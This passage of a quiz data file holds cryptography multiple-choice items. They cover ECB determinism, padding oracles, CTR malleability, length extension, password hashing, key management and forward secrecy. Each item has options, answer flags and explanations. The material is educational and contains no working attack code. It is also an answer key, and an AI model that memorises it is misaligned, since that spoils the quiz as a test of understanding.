      { id: 'opt-c', label: 'C', text: 'Nonce reuse converts AES-GCM into AES-ECB mode, forcing identical plaintext blocks to yield identical ciphertext blocks.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Reusing nonces triggers hardware CPU exceptions in AES-NI processor instructions, causing application server crashes.', isCorrect: false }
    ],
    explanation: 'AES-GCM combines counter mode (CTR) for confidentiality and GHASH for authentication. Reusing a nonce with the same key reuses the keystream, allowing XOR delta recovery between plaintexts. Crucially, nonce reuse under GCM allows an attacker to solve for the GHASH authentication key H, enabling forgery of valid authentication tags for arbitrary ciphertexts.'
  },

  // 2. ECB Mode Determinism (Symmetric Encryption / ECB Weakness) -> Correct Answer: D
  {
    id: 'crypto-2',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'A medical record management system encrypts structured patient files containing fixed-size 128-bit blocks using AES in Electronic Codebook (ECB) mode. An attacker observes ciphertexts transmitted over the network without possessing the secret key. What structural weakness allows the attacker to infer details about the underlying plaintext?',
    options: [
      { id: 'opt-a', label: 'A', text: 'ECB mode leaks the HMAC secret key in the first 16 bytes of every ciphertext stream.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'ECB mode requires a public initialization vector (IV) that must be kept secret from eavesdroppers.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'ECB mode uses asymmetric keys, exposing the private key through modular arithmetic.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'ECB mode processes each 128-bit plaintext block independently without chaining or IVs, causing identical plaintext blocks to produce identical ciphertext blocks and preserving structural data patterns.', isCorrect: true }
    ],
    explanation: 'Electronic Codebook (ECB) mode encrypts each block independently using the same key without an IV or chaining. Identical 128-bit plaintext blocks map to identical 128-bit ciphertext blocks. This reveals structural patterns, repetitions, and data alignment to eavesdroppers even without decrypting the key.'
  },

  // 3. CBC Mode Padding Oracle (CBC Security / Block Cipher Modes) -> Correct Answer: A
  {
    id: 'crypto-3',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'An API endpoint decrypts incoming PKCS#7 padded ciphertexts using AES-CBC. When decryption encounters invalid padding, the server returns a 500 "Bad Padding" error, but when padding is valid, it processes the request or returns a 401 "Invalid Session" error. How can an attacker exploit this behavior?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Execute a Padding Oracle attack, sending systematically modified ciphertexts and using the distinct padding error responses to decrypt arbitrary ciphertexts byte-by-byte without knowing the key.', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'Recover the RSA private key used for server TLS certificate handshake negotiation.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Force the server to automatically upgrade the connection to AES-GCM mode after 100 failed attempts.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Extract raw database access credentials directly from the server HTTP response headers.', isCorrect: false }
    ],
    explanation: 'A Padding Oracle attack occurs when an application decrypting CBC-mode ciphertext reveals whether PKCS#7 padding is valid or invalid. By systematically modifying the preceding ciphertext block (or IV) and observing the padding status response, an attacker acts as an oracle to decrypt the target ciphertext byte-by-byte.'
  },

  // 4. CTR Mode Counter Malleability (CTR Mode / Nonces) -> Correct Answer: C
  {
    id: 'crypto-4',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'A messaging service encrypts payload packets using AES-CTR mode without a Message Authentication Code (MAC). An attacker intercepts a packet and knows bytes 10-15 correspond to the ASCII string "AMOUNT:100". Without knowing the secret key, how can the attacker modify the ciphertext so that the recipient decrypts "AMOUNT:900"?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Solve the Discrete Logarithm Problem on the AES key schedule.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Send an invalid IV parameter to trigger an automatic server fallback to ECB mode.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'XOR the target ciphertext bytes with the bitwise XOR of "100" and "900", taking advantage of CTR mode\'s stream-cipher bitwise malleability in the absence of an authentication tag.', isCorrect: true },
      { id: 'opt-d', label: 'D', text: 'CTR mode automatically detects and rejects any modified ciphertexts using built-in error-correcting codes.', isCorrect: false }
    ],
    explanation: 'AES-CTR converts a block cipher into a stream cipher by encrypting sequential counter values to generate a keystream, which is then XORed with the plaintext. Unauthenticated CTR mode is malleable: bit flips in the ciphertext flip the corresponding bits in the decrypted plaintext. Without an AEAD tag or MAC, attackers can predictably alter plaintext values.'
  },

  // 5. ChaCha20-Poly1305 Construction (ChaCha20-Poly1305 / AEAD) -> Correct Answer: B
  {
    id: 'crypto-5',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'High-throughput mobile applications frequently choose ChaCha20-Poly1305 over AES-GCM for encrypted communication channels. What architectural property distinguishes ChaCha20-Poly1305, making it preferred on platforms lacking hardware-accelerated instructions?',
    options: [
      { id: 'opt-a', label: 'A', text: 'ChaCha20-Poly1305 is an asymmetric public-key primitive requiring no shared secret exchange.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'ChaCha20 is an Add-Rotate-XOR (ARX) stream cipher paired with Poly1305, delivering fast, constant-time software execution without relying on specialized CPU AES-NI hardware instructions.', isCorrect: true },
      { id: 'opt-c', label: 'C', text: 'ChaCha20-Poly1305 permits reusing nonces across multiple sessions without reducing security guarantees.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Poly1305 compresses 4096-bit blocks into 16-bit signatures to eliminate network transport headers.', isCorrect: false }
    ],
    explanation: 'ChaCha20 is a stream cipher based on Add-Rotate-XOR (ARX) operations, and Poly1305 is a fast, one-time MAC. Unlike AES (which requires specialized hardware instructions like AES-NI to execute securely in constant time without side-channel cache attacks), ChaCha20-Poly1305 achieves excellent, constant-time performance purely in software, making it ideal for mobile devices lacking hardware AES acceleration.'
  },

  // 6. HMAC Construction vs Naive Hash Construction (HMAC / Length Extension) -> Correct Answer: A
  {
    id: 'crypto-6',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'A developer implements custom API request signing by computing hash(SecretKey + Message) using SHA-256. An attacker observes a valid Message and its signature. Why is this naive construction vulnerable to a length-extension attack, and why does HMAC-SHA256 prevent it?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Merkle-Damgård hash functions (like SHA-256) allow extending message payloads and computing valid updated hashes using previous output states without knowing SecretKey; HMAC uses a nested two-pass construction H(K_out || H(K_in || M)), neutralizing length extension.', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'SecretKey + Message allows attackers to extract raw secret keys using polynomial factoring.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'HMAC uses RSA public keys rather than symmetric keys, rendering hash collisions impossible.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Length-extension attacks only affect AES block ciphers operating in ECB mode.', isCorrect: false }
    ],
    explanation: 'Standard Merkle-Damgård hash functions (SHA-1, SHA-256, MD5) process messages in blocks and output the internal state after the final block. In H(Key || Message), an attacker knowing the hash and message length can append arbitrary data and calculate the valid hash for H(Key || Message || Padding || ExtraData) without knowing Key. HMAC prevents this by using a nested construction: HMAC(K, M) = H((K XOR opad) || H((K XOR ipad) || M)).'
  },

  // 7. Hash Function Collision Resistance (Collision Resistance / Hash Functions) -> Correct Answer: D
  {
    id: 'crypto-7',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'A digital document signing protocol uses SHA-1 to generate document digests before applying RSA signatures. Researchers demonstrate a practical collision attack against SHA-1, producing two distinct PDF documents (A and B) that yield the exact same SHA-1 digest. Which cryptographic property was broken, and how does this undermine non-repudiation?',
    options: [
      { id: 'opt-a', label: 'A', text: 'First Preimage Resistance was broken, allowing attackers to recover original document plaintexts from hash digests.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Second Preimage Resistance was broken, allowing attackers to find a matching payload for any arbitrary historical document.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Confidentiality was broken, causing SHA-1 digests to automatically decrypt into clear text.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Collision Resistance was broken; an attacker can craft two different documents with identical digests, tricking a victim into signing Document A and later presenting Document B as the legitimately signed file.', isCorrect: true }
    ],
    explanation: 'Collision resistance requires that it be computationally infeasible to find any two distinct inputs x1 != x2 such that H(x1) = H(x2). A collision attack allows an attacker to craft two documents (e.g., benign contract A and malicious contract B) with the same hash. Getting a signature on contract A validates the signature for contract B as well. First and second preimage resistance are distinct properties that remain harder to break than collision resistance.'
  },

  // 8. Argon2id vs Fast Hashes (Argon2 / Password Hashing / Key Stretching) -> Correct Answer: C
  {
    id: 'crypto-8',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'An enterprise identity service stores user passwords by computing SHA-256(Password + Salt) with a unique 128-bit salt per user. An attacker dumps the database containing 1 million salted hashes. Why is salted SHA-256 inadequate against modern offline cracking, and why is Argon2id superior?',
    options: [
      { id: 'opt-a', label: 'A', text: 'SHA-256 salts must be kept secret in an HSM; exposed salts render SHA-256 uncomputable.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'SHA-256 uses asymmetric key pairs, making password validation computationally impossible on modern servers.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'SHA-256 executes rapidly in hardware, allowing offline attackers with GPUs/ASICs to test billions of candidate passwords per second; Argon2id is a memory-hard KDF enforcing configurable memory, time, and parallelism parameters, making GPU/ASIC cracking cost-prohibitive.', isCorrect: true },
      { id: 'opt-d', label: 'D', text: 'Argon2id automatically encrypts the entire database using post-quantum lattice cryptography.', isCorrect: false }
    ],
    explanation: 'Standard cryptographic hash functions like SHA-256 or MD5 are designed to execute as fast as possible on hardware. An attacker with custom GPUs or ASICs can compute billions of SHA-256 hashes per second during offline dictionary/brute-force attacks. Password hashing algorithms like Argon2id, bcrypt, or scrypt are memory-hard and computationally expensive by design (key stretching), forcing attackers to consume significant RAM and clock cycles per password guess, effectively neutralizing massive parallelism.'
  },

  // 9. Role of Salt in Password Hashing (Salt / Password Hashing) -> Correct Answer: B
  {
    id: 'crypto-9',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'A legacy database computes user password hashes using PBKDF2 with 100,000 iterations, but omits per-user salts (using no salt or a static global salt). How does the absence of unique per-user salts degrade the security of the password store?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Without a salt, PBKDF2 fails to execute and defaults to storing passwords in clear text.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Omitting unique salts permits attackers to perform precomputed lookup attacks (rainbow tables) across all users simultaneously, and immediately reveals when multiple accounts share identical passwords.', isCorrect: true },
      { id: 'opt-c', label: 'C', text: 'Salts are secret cryptographic keys; without them, PBKDF2 cannot decrypt stored passwords.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'The absence of a salt enables remote command execution attacks against the database process.', isCorrect: false }
    ],
    explanation: 'A salt is a non-secret, unique random value generated per user account and stored alongside the password hash. The salt serves two vital purposes: 1) It ensures that two users with identical passwords produce completely different password hashes, preventing bulk pattern analysis; 2) It invalidates precomputed hash tables (rainbow tables), forcing an attacker to compute hash iterations individually for each target account during an offline attack.'
  },

  // 10. CSPRNG vs PRNG & Entropy (Secure Random Number Generation / Entropy) -> Correct Answer: A
  {
    id: 'crypto-10',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'A developer generates 128-bit AES session keys in Java using java.util.Random initialized with System.currentTimeMillis(). An attacker intercepts a ciphertext packet and determines the approximate server timestamp when the key was generated. How can the attacker break the encryption?',
    options: [
      { id: 'opt-a', label: 'A', text: 'java.util.Random is a linear congruential PRNG with low entropy and a small seed space; the attacker can brute-force the narrow timestamp seed range in milliseconds to perfectly reproduce the generated AES key.', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'System.currentTimeMillis() transmits the secret key over unencrypted NTP network packets.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'AES keys generated from timestamps automatically revert to 1-bit key lengths.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'java.util.Random causes the OS kernel to flush its entropy pool, forcing a fallback to static ECB keys.', isCorrect: false }
    ],
    explanation: 'Cryptographic applications require a Cryptographically Secure Pseudorandom Number Generator (CSPRNG, such as /dev/urandom or SecureRandom), which draws from OS entropy sources and provides unpredictable, cryptographically unguessable output. Standard non-cryptographic PRNGs (like java.util.Random or Math.random()) use linear congruential generators seeded with predictable values like time. Attackers can brute-force the tiny seed space and perfectly reconstruct the generated keys.'
  },

  // 11. Envelope Encryption Architecture (Key Management / KMS) -> Correct Answer: D
  {
    id: 'crypto-11',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'A cloud application needs to encrypt millions of customer files stored in object storage. Instead of sending full file payloads over API calls to a central Hardware Security Module (HSM) or Key Management Service (KMS), the system adopts Envelope Encryption. How does Envelope Encryption operate?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Central KMS keys encrypt data directly in client browser memory, eliminating server calls.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Envelope Encryption stores all data encryption keys in clear text in database index tables.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Customer data is hashed with SHA-256 and sent to the KMS for digital signature verification.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Data is encrypted locally using a unique, ephemeral Data Encryption Key (DEK); the DEK itself is encrypted under a long-term Key Encryption Key (KEK) managed by KMS and stored alongside the encrypted data object.', isCorrect: true }
    ],
    explanation: 'Envelope Encryption uses a two-tier key hierarchy: 1) Local plaintext data is encrypted using a unique, randomly generated Data Encryption Key (DEK) via fast symmetric ciphers (e.g. AES-GCM); 2) The DEK is sent to a central KMS where it is encrypted under a master Key Encryption Key (KEK). The encrypted DEK is stored next to the ciphertext. To decrypt, only the tiny DEK is sent to KMS for decryption, minimizing KMS overhead while maintaining centralized access control over the KEK.'
  },

  // 12. Key Rotation Strategies (Key Rotation / Agility) -> Correct Answer: C
  {
    id: 'crypto-12',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'An enterprise security policy mandates annual cryptographic key rotation for database field encryption. The security team rotates the active master key K1 to a new key K2 in the KMS. However, applications fail to read database records encrypted three years ago under K1. How should key rotation be properly managed?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Old keys must be deleted immediately upon rotation to enforce zero-trust data destruction.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Rotating keys requires re-encrypting all client browser TLS certificates simultaneously.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Key rotation should retire K1 from encrypting NEW data while retaining K1 in a restricted "decrypt-only" state for legacy ciphertexts (or re-encrypting existing database rows from K1 to K2), tracking key versions alongside ciphertexts.', isCorrect: true },
      { id: 'opt-d', label: 'D', text: 'Master keys should be derived from static passwords so old data can be recovered by re-entering legacy credentials.', isCorrect: false }
    ],
    explanation: 'Cryptographic key rotation involves generating a new active key version for future encryption operations. Existing stored ciphertext encrypted under previous key versions remains unreadable unless the key management system retains historical key versions marked as "decrypt-only", or executes a background data migration task to decrypt legacy rows under K1 and re-encrypt them under K2. Deleting K1 renders all data encrypted under K1 permanently lost.'
  },

  // 13. HKDF & Key Derivation (Key Derivation / HKDF) -> Correct Answer: A
  {
    id: 'crypto-13',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'A secure communications protocol establishes a single shared master secret S between two peers via Elliptic Curve Diffie-Hellman (ECDH). The protocol needs to establish separate, independent sub-keys for encryption, authentication, and direction-specific IVs. Why should the protocol use an HMAC-based Key Derivation Function (HKDF) rather than slicing S directly?',
    options: [
      { id: 'opt-a', label: 'A', text: 'HKDF first "extracts" uniform pseudorandomness from the raw Diffie-Hellman output (concentrating non-uniform entropy), and then "expands" it into multiple cryptographically independent sub-keys bound to explicit context labels.', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'Slicing shared secrets causes CPUs to execute out-of-order byte execution, leaking keys via power analysis.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'HKDF converts symmetric shared secrets into asymmetric RSA 4096-bit private key pairs.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Raw Diffie-Hellman secrets automatically expire after 64 bytes of slicing.', isCorrect: false }
    ],
    explanation: 'Raw secrets output by key agreement schemes (like Diffie-Hellman) often exhibit non-uniform entropy distribution across their bits. Directly slicing or using a raw secret for multiple cryptographic roles violates key separation principles. HKDF (RFC 5869) addresses this via two phases: 1) Extract (concentrating entropy into a uniform master PRK using HMAC), and 2) Expand (generating multiple cryptographically isolated sub-keys tied to explicit application context tags info, preventing cross-key leakage).'
  },

  // 14. Hardware Security Modules & Key Isolation (Hardware-Backed Keys) -> Correct Answer: B
  {
    id: 'crypto-14',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'A high-security financial platform stores root signing keys inside a FIPS 140-2 Level 3 Hardware Security Module (HSM). An attacker completely compromises the underlying operating system on the application server connected to the HSM. What protection does the HSM provide regarding the private key?',
    options: [
      { id: 'opt-a', label: 'A', text: 'The HSM automatically removes malware from the compromised host operating system.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'The HSM enforces hardware key isolation; while the attacker can request signing operations through authenticated sessions, the raw private key material CANNOT be extracted or exfiltrated from the HSM hardware boundary.', isCorrect: true },
      { id: 'opt-c', label: 'C', text: 'The HSM revokes all public TLS certificates across the global internet within 5 seconds.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Hardware Security Modules use quantum entanglement to erase server RAM if an OS shell is opened.', isCorrect: false }
    ],
    explanation: 'Hardware Security Modules (HSMs) are tamper-resistant cryptographic physical appliances designed to protect cryptographic keys throughout their lifecycle. FIPS 140-2/140-3 Level 3+ HSMs guarantee that private key material never leaves the secure hardware boundary in plaintext, even if the host OS communicating with the HSM is fully compromised. While the host can request the HSM to execute crypto operations, exfiltration of the raw key is physically and logically prevented.'
  },

  // 15. Multi-Tenant KMS Isolation & Contextual Encryption (Multi-Tenant Key Management) -> Correct Answer: D
  {
    id: 'crypto-15',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'A SaaS platform hosts multiple enterprise tenants on a shared database cluster and uses a central KMS for field-level encryption. To prevent cross-tenant data leakage (where a software bug allows Tenant A to pass Tenant B\'s encrypted data to KMS for decryption), the application attaches an Encryption Context (e.g. {"tenant_id": "Tenant_A"}) during encryption calls. How does Encryption Context enforce isolation?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Encryption Context converts symmetric AES keys into public SSH host keys.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Encryption Context compresses database records to prevent SQL injection.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Encryption Context acts as a salt that accelerates RSA signature verification speed.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'KMS cryptographically binds the non-secret Encryption Context to the authenticated payload; decryption attempts WILL FAIL unless the exact same tenant_id key-value context is supplied on decrypt calls.', isCorrect: true }
    ],
    explanation: 'Encryption Context is additional authenticated data (AAD) bound to the ciphertext by KMS during AEAD encryption. It is not secret, but if the exact same Encryption Context (e.g., {"tenant_id": "Tenant_A"}) is not provided on the KMS Decrypt request, decryption fails. This ensures that even if Tenant B obtains Tenant A\'s ciphertext, attempting to decrypt it under Tenant B\'s context parameter will be rejected by KMS.'
  },

  // 16. Key Separation Principle (Cryptographic Key Reuse) -> Correct Answer: C
  {
    id: 'crypto-16',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'A developer configures an RSA 2048-bit key pair and uses the same key pair for BOTH negotiating TLS session encryption (RSA key exchange/decryption) AND signing outgoing REST API JWT tokens. Why does reusing a key pair across different cryptographic operations violate secure architecture principles?',
    options: [
      { id: 'opt-a', label: 'A', text: 'RSA keys self-destruct if invoked by two different software execution threads simultaneously.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Combining encryption and signatures automatically reduces key length from 2048 bits to 1024 bits.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Reusing keys across different algorithms or roles introduces cross-protocol vulnerabilities (where chosen ciphertext in encryption protocols yields valid signatures) and expands compromise impact.', isCorrect: true },
      { id: 'opt-d', label: 'D', text: 'Digital signatures require symmetric AES keys, whereas TLS encryption requires ECDSA keys.', isCorrect: false }
    ],
    explanation: 'Cryptographic key separation is a fundamental security mandate: a key should be used for exactly one purpose (e.g., signing OR encryption OR key agreement, but never both). Reusing a key across multiple protocols opens cross-protocol vulnerabilities (e.g., Bleichenbacher padding attacks on RSA encryption leaking data that compromises signature schemes) and expands the impact if one protocol is flawed.'
  },

  // 17. Constant-Time String Comparisons (Side-Channel Analysis / Timing Attacks) -> Correct Answer: A
  {
    id: 'crypto-17',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'An authentication service checks incoming webhook HMAC signatures using the code: return userSignature === computedSignature;. Security testing reveals response latency varies by microseconds based on how many leading characters match. What vulnerability exists, and how is it fixed?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Timing Side-Channel Attack; fixed by using a constant-time comparison function (e.g. crypto.timingSafeEqual()) that evaluates all bytes regardless of early non-matches.', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'Padding Oracle Attack; fixed by switching from HMAC to plain SHA-1 digests.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Length Extension Attack; fixed by shortening the HMAC secret key length.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Replay Attack; fixed by forcing HTTP connections to run over port 443.', isCorrect: false }
    ],
    explanation: 'Standard string equality operators (=== or strcmp) exit early as soon as they encounter the first non-matching byte to optimize performance. An attacker can measure minute differences in execution response times (timing attack) to deduce the correct signature byte-by-byte. Remediating timing attacks requires constant-time string comparisons (timingSafeEqual) that always compare all bytes in constant time regardless of early byte mismatches.'
  },

  // 18. Secret Zeroization in Memory (Key Storage / Memory Lifecycle) -> Correct Answer: B
  {
    id: 'crypto-18',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'A C/C++ security backend processes raw RSA private key buffers in RAM during authentication token generation. After completing operations, the code calls free(key_buffer). Why is calling free() alone insufficient to protect key material in low-level languages, and what extra step is required?',
    options: [
      { id: 'opt-a', label: 'A', text: 'free() automatically dumps key material into OS system log files.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'free() releases heap pointers without wiping underlying RAM bytes, leaving sensitive keys readable in memory dumps or future allocations; memory must be zeroized using explicit volatile clearing (e.g. explicit_bzero) BEFORE freeing.', isCorrect: true },
      { id: 'opt-c', label: 'C', text: 'Memory allocators require AES encryption before calling free().', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Operating systems convert freed heap memory into public environment variables.', isCorrect: false }
    ],
    explanation: 'Memory management functions like free() or garbage collectors simply mark memory regions as available for reallocation; they do not overwrite the underlying physical memory. If the process crashes or an attacker reads heap memory, residual plaintext keys remain accessible. Secure key management requires zeroizing key buffers (explicit_bzero or memset_s) immediately after use to wipe private key bytes from RAM before releasing memory.'
  },

  // 19. RSA Padding Schemes: OAEP vs Unpadded (RSA Security / Padding) -> Correct Answer: D
  {
    id: 'crypto-19',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'An application encrypts sensitive customer SSNs using raw RSA encryption without padding (often called "textbook RSA"): C = M^e mod N. Why is unpadded/textbook RSA cryptographically insecure, and why is RSA-OAEP required?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Textbook RSA requires 256-bit symmetric keys, whereas OAEP operates without modulo math.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'OAEP converts RSA from an asymmetric algorithm into a block cipher operating in CBC mode.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Unpadded RSA is mathematically impossible to decrypt on modern x86 server hardware.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Textbook RSA is deterministic (M always encrypts to C), vulnerable to small exponent and multiplicative homomorphic attacks; RSA-OAEP introduces probabilistic encoding and hash masks, ensuring IND-CCA2 security.', isCorrect: true }
    ],
    explanation: 'Unpadded ("textbook") RSA C = M^e mod N lacks semantic security: encrypting the same message M yields the exact same ciphertext C, allowing dictionary attacks. Furthermore, multiplicative properties allow attackers to construct ciphertexts that decrypt to predictable multiples of plaintexts (M1 * M2). RSA-OAEP introduces randomness and hashing, making the scheme probabilistic and resistant to chosen-ciphertext attacks (IND-CCA2).'
  },

  // 20. Diffie-Hellman MITM Vulnerability (Diffie-Hellman) -> Correct Answer: C
  {
    id: 'crypto-20',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'Two remote network nodes execute an unauthenticated classical Diffie-Hellman (DH) key exchange over an open network. Peer A sends g^a mod p to Peer B, and Peer B sends g^b mod p to Peer A. An active attacker intercepts communications in transit. What fundamental vulnerability exists in plain Diffie-Hellman?',
    options: [
      { id: 'opt-a', label: 'A', text: 'The discrete logarithm problem can be solved in O(1) time on standard microprocessors.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Diffie-Hellman requires pre-shared symmetric keys to compute g^a mod p.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Plain Diffie-Hellman provides key agreement but lacks peer authentication, making it vulnerable to Man-in-the-Middle (MITM) attacks where the attacker establishes distinct keys with both peers independently.', isCorrect: true },
      { id: 'opt-d', label: 'D', text: 'Diffie-Hellman key exchanges leak the AES master key inside cleartext p parameter headers.', isCorrect: false }
    ],
    explanation: 'Unauthenticated Diffie-Hellman provides anonymous key agreement: it allows two parties to establish a shared secret over an insecure channel, but neither party can verify the identity of the other. An active network attacker intercepts Peer A\'s public value, substitutes their own g^x, establishes key K1 with Peer A, and establishes key K2 with Peer B. To prevent MITM attacks, DH must be combined with authentication (e.g. digital signatures/certificates in TLS).'
  },

  // 21. Elliptic Curve Cryptography Efficiency (ECC / Public-Key Cryptography) -> Correct Answer: B
  {
    id: 'crypto-21',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'A cloud service migrates its public-key infrastructure from RSA-3072 to Elliptic Curve Cryptography using Curve25519 / ECDSA (P-256). What is the main security and architectural advantage of ECC over RSA at equivalent security levels?',
    options: [
      { id: 'opt-a', label: 'A', text: 'ECC provides mathematical encryption that can never be broken even by infinite quantum computing power.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'ECC achieves equivalent cryptographic security with much smaller key sizes (e.g. 256-bit ECC matches ~3072-bit RSA), significantly reducing CPU overhead, RAM usage, and network handshake sizes.', isCorrect: true },
      { id: 'opt-c', label: 'C', text: 'ECC removes the requirement for hash functions in digital signatures.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'RSA keys require symmetric pre-shared secrets, whereas ECC operates without keys.', isCorrect: false }
    ],
    explanation: 'Elliptic Curve Cryptography (ECC) relies on the hardness of the Elliptic Curve Discrete Logarithm Problem (ECDLP). Because ECDLP is significantly harder to break per key bit than integer factorization (RSA), ECC achieves comparable security with much smaller keys (e.g., 256-bit ECC provides equivalent security to 3072-bit RSA). Smaller keys mean faster computations, lower energy consumption, and reduced TLS handshake packet sizes.'
  },

  // 22. Ephemeral Diffie-Hellman & Forward Secrecy (Forward Secrecy / TLS) -> Correct Answer: A
  {
    id: 'crypto-22',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'An enterprise web server uses an RSA certificate for TLS 1.2. Config A uses static RSA key exchange (TLS_RSA_WITH_AES_128_CBC_SHA). Config B uses Ephemeral Elliptic Curve Diffie-Hellman (TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256). Years later, an attacker steals the server\'s long-term RSA private key. What happens to recorded historical session traffic?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Under Config A (static RSA), the attacker can retroactively decrypt ALL historical recorded traffic; under Config B (ECDHE), Perfect Forward Secrecy (PFS) ensures past sessions remain secure because ephemeral keys were discarded after each session.', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'Config B allows retroactive decryption because ECDHE keys are derived from the public certificate.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Neither configuration allows decryption because TLS session keys automatically erase themselves from network captures.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Config A is immune to key theft because RSA private keys rotate on every HTTP request.', isCorrect: false }
    ],
    explanation: 'In static RSA key exchange (Config A), the client encrypts the pre-master secret directly with the server\'s long-term public RSA key. If the long-term private key is ever compromised in the future, an attacker possessing recorded historical traffic can decrypt all past session secrets. Ephemeral Diffie-Hellman (ECDHE, Config B) provides Perfect Forward Secrecy (PFS): a unique, temporary key pair is generated per session and discarded immediately after use, so compromising the long-term server key does not compromise past sessions.'
  },

  // 23. ECDSA Nonce Reuse Catastrophe (Digital Signatures / ECDSA) -> Correct Answer: C
  {
    id: 'crypto-23',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'A mobile cryptocurrency wallet signs transactions using ECDSA with Curve P-256. A bug in the random number generator causes the per-signature nonce k to repeat across two different transaction signatures generated by the same private key d. What is the security consequence of reusing an ECDSA nonce k?',
    options: [
